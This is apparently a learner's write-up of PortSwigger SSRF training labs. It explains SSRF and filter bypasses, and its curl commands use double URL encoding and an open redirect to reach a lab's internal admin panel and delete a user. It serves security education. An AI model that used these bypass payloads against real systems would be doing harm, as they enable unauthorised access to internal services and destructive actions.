# Server Side Request Forgery (SSRF)

This writeup covers the Server-side request forgery learning path on Portswigger.

## What is SSRF

Server side request forgery occurs when an attacker is able to supply the location (url) which the backend then requests. SSRF can also enable the attacker to reach internal systems which would otherwise be blocked by a firewall or unreachable from the internet.

## Common SSRF attacks

SSRF often leverages trust relationships between the vulnerable service and other privileged services. This could be requests to local only admin functionality or services running on the server.

## Circumvention common SSRF defenses

Often servers use a blacklist of urls and hostnames which are off limits. This could be `127.0.0.1` and the equivalent `localhost`. This can often be bypassed by using alternative representations, redirects or different encodings.

## Lab: SSRF with blacklist-based input filter

**Lab Description**:  This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

### Lab solution

First we look at the stock api request which will be sent when checking the stock of an item:

```HTTP
POST /product/stock
HTTP/2 200 
content-type: text/plain; charset=utf-8
content-encoding: gzip
x-frame-options: SAMEORIGIN
content-length: 23
X-Firefox-Spdy: h2

Request body:
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

As seen the frontend is posting a Form data body with the URL encoded stock api to check. We can use this to cause SSRF. There should be a blocklist in place, so lets try to request `http://localhost/admin`.

**NOTE**: I will use Curl for the request, and cyberchef to encode the payload if needed.

```curl
curl https://0a70004d0481593585e9d1ea002200fa.web-security-academy.net/product/stock -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "stockApi=http://localhost/admin"

"External stock check blocked for security reasons"% 
```

We see that we have been blocked due to security reasons as expected. Now we can try different representations to check the coverage of the blacklist. Neither `127.1` or `2130706433` works. Lets try URL encoding. This is also blocked. Next thing I want to try is redirecting. For this purpose I use `requestrepo.com`. Which provides a URL we control. 

Using:

```HTML
<head>
  <meta http-equiv="Refresh" content="0; URL=https://example.com/" />
</head>
```

as the repsonse from our Request repo url returns an error from the server:

```HTML
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                    </header>
                    <h4>Internal Server Error</h4>
                    <p class=is-warning>Could not connect to external stock check service</p>
                </div>
            </section>
        </div>
    </body>
</html>
```

This means we are bypassing the security blacklist. Now we just need to actually make it return the admin page. The curl command looks like this:

```bash
curl https://0a70004d0481593585e9d1ea002200fa.web-security-academy.net/product/stock -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "stockApi=http://pdw9bv8e.requestrepo.com"
```

Unfortunately the lab is solveable by using redirect. After a lot of tries, I looked at a hint and saw that the lab is solveable by obfuscation. Frankly I don't get the solution as URL encoding an `a` in my mind, only produces the same char.

```HTML
curl https://0a70004d0481593585e9d1ea002200fa.web-security-academy.net/product/stock -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "stockApi=http://127.1/%2561dmin"
<!DOCTYPE html>
<html>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/admin">Admin panel</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
                    <br>
                    <hr>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

Solution:

```bash
curl https://0a70004d0481593585e9d1ea002200fa.web-security-academy.net/product/stock -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "stockApi=http://127.1/%2561dmin/delete?username=carlos"
```

This works by converting the UTF-8 character `a` to its hex representation, then adding the URL encoded `%` character. Then URL decoding it twice will give return the original `a`. In this example the validation decodes the URL first, and it results in the valid string `%61`. After this the backend fucntionality will URL decode once again, resulting in `a`. This solves the lab.

**NOTE**: The url decoding explained above is visualized with cyberchef on this link: <https://gchq.github.io/CyberChef/#recipe=To_Hex('Space',0)Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'%25',true,false,true,false)URL_Encode(false)URL_Decode()URL_Decode()&input=YQ>

## SSRF with whitelist-based input filters

As we have previously seen, a whitelist is a better defense compared to a blacklist, as it is very hard to keep a complete blacklist of everything we want to disallow. With whitelist we just define what we actually want.

Yet bypassing a whitelist is not impossible. It is possible to embed credentials in URLs: `https://expected-host:fakepassword@evil-host`.

## Bypassing SSRF filters via open redirection

If the allowed URLs contain a redirect functionality, the whitelist can be bypassed by making the allowed service redirect to our desired malicious URL. This is called open redirection and requires the backend to have an allowed services, which has a redirection functionality implemented (or atleas allows redirection).

## Lab: SSRF with filter bypass via open redirection vulnerability

**Lab Description**:  This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://192.168.0.12:8080/admin` and delete the user `carlos`.

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.

### Lab solution

We start by figuring out where the redirect functionality is located. The obvious place to start is the stock check api. The stock API is probably the entrypoint of the SSRF once again:

```HTTP
/product/stock

Body:
stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

Now we need to find the actual redirection. Looking through the product page, we see that a "next product" button is available. The link specifies a path property, just like the one in the example of open redirection: `/product/nextProduct?currentProductId=1&path=/product?productId=2`. Lets see if this is not the way to go. To solve this lab I will be using Curl again.

```bash
curl 'https://0a4800e103d183b4819b751600ec0052.web-security-academy.net/product/stock' --compressed -X POST --data-raw 'stockApi=%2Fproduct%2FnextProduct%3FcurrentProductId%3D1%26path%3Dhttp%3A%2F%2F192%2E168%2E0%2E12%3A8080%2Fadmin'
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/admin">Admin panel</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/http://192.168.0.12:8080/admin/delete?username=wiener">Delete</a>
                        </div>
                        <span>carlos - </span>
                            <a href="/http://192.168.0.12:8080/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
                    <br>
                    <hr>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

```

Using the next product functionality and url encoding the entire URL, so that `/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?user=carlos`--> `%2Fproduct%2FnextProduct%3FcurrentProductId%3D1%26path%3Dhttp%3A%2F%2F192%2E168%2E0%2E12%3A8080%2Fadmin%2Fdelete%3Fuser%3Dcarlos`.

We see that just like the last lab, we use the delete path to delete the user. In curl:

```bash
curl 'https://0a4800e103d183b4819b751600ec0052.web-security-academy.net/product/stock' --compressed -X POST --data-raw 'stockApi=%2Fproduct%2FnextProduct%3FcurrentProductId%3D1%26path%3Dhttp%3A%2F%2F192%2E168%2E0%2E12%3A8080%2Fadmin%2Fdelete%3Fusername%3Dcarlos'
<!DOCTYPE html>
<html>
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/admin">Admin panel</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section>
                        <p>User deleted successfully!</p>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/http://192.168.0.12:8080/admin/delete?username=wiener">Delete</a>
                        </div>
                    </section>
                    <br>
                    <hr>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

This solves the lab!

## Blind SSRF vulnerabilities

Blind SSRF is when the response of the supplied URL is not returned to the attacker/user. It is hard to exploit blind SSRF to retrieve data from the backend system. But often, it can lead to RCE.

The easiest way to discover blind SSRF, is to cause the back-end to send HTTP request to a destination the attacker controls. This could be a service like requestrepo, where all requests are logged.

**NOTE**: It is common to see that HTTP traffic is blocked when requesting outbound destinations, however the DNS traffic will be received as outbound DNS lookups are used for many purposes.

## Lab: Blind SSRF with out-of-band detection

I will revisit this later, as it requires Burp Collaborator to solve.

## Finding hidden attack surface for SSRF vulnerabilities

Sometimes the attacker only controls a partial part of the URL. This makes the SSRF quite limited. URL within data formats can also be used to cause SSRF, even if the server does not implement vulnerable functionality directly. An example is XXE injection in XML formats.

The referer header used for analytics is often visited by the server in order to retrieve data about the visiting user. This is a great place for SSRF.
